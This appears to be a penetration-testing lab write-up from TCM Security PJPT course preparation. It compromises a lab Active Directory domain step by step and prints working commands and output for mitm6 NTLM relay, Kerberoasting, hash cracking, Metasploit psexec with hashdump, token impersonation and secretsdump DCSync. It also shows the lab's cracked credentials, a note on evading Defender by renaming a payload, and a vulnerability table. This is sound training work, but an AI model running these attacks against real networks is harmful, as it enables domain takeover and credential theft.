# Active Directory Penetration Testing 
### TCM Security – Practical Junior Penetration Tester (PJPT) Course
**Domain:** `pepstcm.co.za` | **DC:** `TCM-DC01` (192.168.88.138)

---

## Lab Environment

| Machine | IP | Role |
|---|---|---|
| Kali Linux (Attacker) | 192.168.88.142 | Attack machine |
| TCM-DC01 | 192.168.88.138 | Domain Controller (Windows Server 2022) |
| ThePunisher | 192.168.88.140 | Victim workstation |
| Spiderman | 192.168.88.139 | Victim workstation |

---

## Attack Chain Overview

```
Reconnaissance → MITM6 / DNS Takeover → Credential Capture
→ Password Cracking → Kerberoasting → Lateral Movement
→ Hash Dumping → Domain Compromise
```

---

## Phase 1 – Domain Enumeration

**Tool:** PowerShell (PowerView / native)  
<img width="1920" height="1080" alt="domain enumeration" src="https://github.com/user-attachments/assets/785b6d4d-4efc-4b39-a05a-4f4d23612e1d" />
<img width="1920" height="1080" alt="domain User enumeration" src="https://github.com/user-attachments/assets/22a6305c-461c-4c9f-b4ba-ef0c247696cb" />



```powershell
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy
(Get-DomainPolicy)."systemaccess"
Get-NetUser
```

**Findings:**
- Domain: `pepstcm.co.za`
- DC: `tcm-dc01.pepstcm.co.za` — Windows Server 2022 Standard Evaluation
- Domain Mode Level: 7
- Users found: `Administrator`, `apepengweni`, `nholwana`, `smgidi`, `SQLService`

---

## Phase 2 – Password Policy Enumeration

**Tool:** PowerShell  
<img width="1920" height="1080" alt="Password Policy" src="https://github.com/user-attachments/assets/b94da267-b078-408e-a7d5-05a0c8e31ca8" />



```powershell
(Get-DomainPolicy)."systemaccess"
```

**Findings:**

| Policy | Value |
|---|---|
| MinimumPasswordLength | 7 |
| PasswordComplexity | 1 (Enabled) |
| MaximumPasswordAge | 42 days |
| PasswordHistorySize | 24 |
| LockoutBadCount | **0** (No lockout!) |

> ⚠️ **Finding:** No account lockout policy — brute force attacks are safe to execute without risk of locking accounts.

---

## Phase 3 – MITM6 Attack (IPv6 DNS Poisoning)

**Tool:** `mitm6`  
<img width="1920" height="1080" alt="mitm6 attack domain users" src="https://github.com/user-attachments/assets/5423e46c-bff3-4944-9f8e-4c1e9b6cbafe" />
<img width="1920" height="1080" alt="DNS Take over create user account on the domain" src="https://github.com/user-attachments/assets/e561fb72-ad65-4051-ba0f-ae5cae21c500" />



```bash
cd /opt/mitm6
python3 mitm6.py -d pepstcm.co.za
# (Combined with ntlmrelayx in relay mode)
ntlmrelayx.py -6 -t ldaps://192.168.88.138 -wh fakewpad -l lootme
```

**What Happened:**
- mitm6 poisoned IPv6 DNS responses on the network
- Victim machines (`192.168.88.140`) sent WPAD/NTLM auth to the attacker
- ntlmrelayx relayed the connection to LDAPS on the Domain Controller
- Privilege enumeration: **Create User**, **Add to Enterprise Admins**, **Modify Domain ACL**

**Result:**
```
[*] Adding new user with username: HgaRqRLoyJ and password: X{(lH+fg}z0)J#B — result: OK
[*] User HgaRqRLoyJ now has Replication-Get-Changes-All privileges on the domain
```
> ⚠️ **Critical Finding:** Attacker created a domain user with **DCSync privileges** via NTLM relay.

**Domain User Confirmed:** `HgaRqRLoyJ` visible in Active Directory Users and Computers <img width="1920" height="1080" alt="AD Account created" src="https://github.com/user-attachments/assets/22f79de1-3bf9-4e7a-9b08-b210bb045315" />


---

## Phase 4 – NTLM Hash Capture & Cracking

**Tool:** `hashcat`, `rockyou.txt`  
<img width="1920" height="1080" alt="cracked password" src="https://github.com/user-attachments/assets/9342c2c0-2d74-41cc-99f5-190576db0e9d" />


**Captured Hash (NetNTLMv2):**
```
NHOLWANA::PEPSTCM:<hash>
```

**Cracked with hashcat:**
```bash
hashcat -m 5600 nholwana.hash /usr/share/wordlists/rockyou.txt
```

**Result:**
```
Status: Cracked
Hash Type: NetNTLMv2
Cracked: Password1
```

> 🔑 **Credential:** `pepstcm\nholwana : Password1`

---

## Phase 5 – BloodHound / SharpHound Enumeration

**Tool:** BloodHound + SharpHound (data in zip: `20250907165405_file.zip`)  
<img width="1920" height="1080" alt="All Domain Admins" src="https://github.com/user-attachments/assets/0d402b0a-b2a3-4d81-8569-9f6e3c17520b" />
<img width="1920" height="1080" alt="shortest path to Domain Admins" src="https://github.com/user-attachments/assets/3940cab2-504e-4468-8bc8-223c7971411b" />


**Domain Admins identified:**

| User | Notes |
|---|---|
| `SQLSERVICE@PEPSTCM.CO.ZA` | Password stored in description field! |
| `APEPENGWENI@PEPSTCM.CO.ZA` | Member of DA, EA, Schema Admins |
| `ADMINISTRATOR@PEPSTCM.CO.ZA` | Built-in admin |

**Shortest Path to Domain Admins:**  
`USERS@PEPSTCM.CO.ZA` → (WriteDacl) → `APEPENGWENI` → MemberOf → `DOMAIN ADMINS`

> ⚠️ **Finding:** `SQLService` account has its password written in the AD description field in plaintext — visible to any authenticated user.

---

## Phase 6 – Kerberoasting

**Tool:** `GetUserSPNs.py` (Impacket)  
<img width="1920" height="1080" alt="kerberoasting hash" src="https://github.com/user-attachments/assets/98efa016-b044-4e80-b3f0-3988cfd508f7" />
<img width="1920" height="1080" alt="kerberos tgs password cracked" src="https://github.com/user-attachments/assets/20264309-6555-4171-8ebf-fbe7a9fbbe84" />



```bash
python3 /usr/local/bin/GetUserSPNs.py PEPSTCM.co.za/nholwana:Password1 -dc-ip 192.168.88.138 -request
```

**SPN Found:**
```
ServicePrincipalName: TCM-DC01/SQLService.PEPSTCM.co.za:60111
Account: SQLService
```

**TGS Hash captured:** `$krb5tgs$23$*SQLService$PEPSTCM.CO.ZA$...*`

**Cracking:**
```bash
hashcat -m 13100 sqlservice.hash /usr/share/wordlists/rockyou.txt
```

**Result:**
```
Status: Cracked
Password: MYpassword123#
```

> 🔑 **Credential:** `pepstcm\SQLService : MYpassword123#`

---

## Phase 7 – CrackMapExec Lateral Movement / Validation

**Tool:** `crackmapexec`  
<img width="1920" height="1080" alt="crackmapexec" src="https://github.com/user-attachments/assets/da953913-859b-4af2-9f8a-0aee93c8eed4" />


```bash
crackmapexec smb 192.168.88.0/24 -u nholwana -d PEPSTCM.co.za -p Password1
```

**Results:**

| Host | IP | Result |
|---|---|---|
| THEPUNISHER | 192.168.88.140 | ✅ **Pwn3d!** |
| SPIDERMAN | 192.168.88.139 | ✅ **Pwn3d!** |
| ATHENKOSI | 192.168.88.1 | ❌ Connection Error |
| TCM-DC01 | 192.168.88.138 | ❌ (signing required) |

> ⚠️ **Finding:** `nholwana` credentials valid on multiple machines — password reuse / local admin rights.

---

## Phase 8 – Metasploit / PSExec & Hash Dumping

**Tool:** Metasploit `exploit/windows/smb/psexec`  
<img width="1920" height="1080" alt="metasploit payload on nholwana" src="https://github.com/user-attachments/assets/7c95d5e9-be10-4caf-9389-4eaf9e2889dd" />
<img width="1920" height="1080" alt="dump hashes metasploit" src="https://github.com/user-attachments/assets/34964039-9ab6-4ae3-a21b-5f89d31402bb" />



```ruby
use exploit/windows/smb/psexec
set RHOSTS 192.168.88.140
set SMBUser nholwana
set SMBPass Password1
set SMBDomain pepstcm.co.za
set LHOST 192.168.88.142
set LPORT 4444
run
```

**Meterpreter session opened → hashdump:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Nkcubeko Holwana:1001:...:64f12cddaa88057e06a81b54e73b949b:::
Punisher:1001:...:ffc3ccd1379ed6768b9e80d3f0eed76c:::
```

> ⚠️ **Note:** Windows Defender (`Backdoor:Win64/Meterpreter.GNN!MTB`) quarantined the first payload attempt — screenshot: `metasploit_meterpreter_token_impersonation.png`. Subsequent run with different payload name succeeded.

---

## Phase 9 – Token Impersonation (Incognito)

**Tool:** Meterpreter incognito module  
<img width="1643" height="886" alt="impersonated nholwana" src="https://github.com/user-attachments/assets/616c6e5b-0d6c-4946-b9fa-c3dd3f822dca" />


```
meterpreter > load incognito
meterpreter > impersonate_token pepstcm\\nholwana
[+] Successfully impersonated user PEPSTCM\nholwana
```

---

## Phase 10 – Secretsdump (DCSync)

**Tool:** `secretsdump.py` (Impacket)  
<img width="1920" height="1080" alt="secretsdump" src="https://github.com/user-attachments/assets/65914f40-f3aa-448d-b71f-e5c4c3278ced" />


```bash
# Against workstation (ThePunisher)
secretsdump.py pepstcm/nholwana:Password1@192.168.88.140

# Against Domain Controller (using DCSync user created in Phase 3)
secretsdump.py pepstcm/HgaRqRLoyJ:'X{(lH+fg}z0)J#B'@192.168.88.138
```

**Hashes dumped from DC:**
```
Administrator:500:...:64f12cddaa88057e06a81b54e73b949b:::
PEPSTCM.CO.ZA\nholwana:$DCC2$10240#nholwana#...
PEPSTCM.CO.ZA\Administrator:$DCC2$10240#Administrator#...
```

> ⚠️ **Critical Finding:** Full domain hash dump achieved via DCSync using the relay-created account. Domain fully compromised.

---

## Credentials Summary

| Username | Password / Hash | Method |
|---|---|---|
| `nholwana` | `Password1` | NTLM relay + hashcat |
| `SQLService` | `MYpassword123#` | Kerberoasting + hashcat |
| `HgaRqRLoyJ` (attacker-created) | `X{(lH+fg}z0)J#B` | NTLM relay (mitm6) |
| `Administrator` (local) | `64f12cddaa88057e...` (NTLM) | hashdump/secretsdump |

---

## Key Vulnerabilities Found

| # | Vulnerability | Severity | Affected |
|---|---|---|---|
| 1 | IPv6 enabled — MITM6/WPAD attack possible | Critical | Domain-wide |
| 2 | NTLM relay to LDAPS allowed (no signing) | Critical | TCM-DC01 |
| 3 | No account lockout policy | High | Domain-wide |
| 4 | Password in AD description field (SQLService) | High | SQLService |
| 5 | Kerberoastable service account with weak password | High | SQLService |
| 6 | SMB signing disabled on workstations | High | ThePunisher, Spiderman |
| 7 | Password reuse across machines | High | nholwana |
| 8 | Windows Defender disabled / tamper protection off | High | ThePunisher |
| 9 | Weak minimum password length (7 chars) | Medium | Domain-wide |

---

## Tools Used

- `mitm6` — IPv6 DNS poisoning
- `ntlmrelayx.py` (Impacket) — NTLM relay to LDAPS
- `GetUserSPNs.py` (Impacket) — Kerberoasting
- `secretsdump.py` (Impacket) — DCSync / hash extraction
- `hashcat` — Password cracking (rockyou.txt)
- `crackmapexec` — SMB enumeration and lateral movement
- `Metasploit` (`psexec`) — Remote code execution
- `BloodHound` + `SharpHound` — AD attack path mapping
- PowerShell + PowerView — Domain enumeration

---

## References

- [TCM Security PJPT Course](https://academy.tcm-sec.com)
- [TCM Security YouTube](https://www.youtube.com/@TCMSecurityAcademy)
- [Impacket](https://github.com/fortra/impacket)
- [mitm6](https://github.com/dirkjanm/mitm6)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

---

*Lab completed as part of TCM Security PJPT certification preparation.*
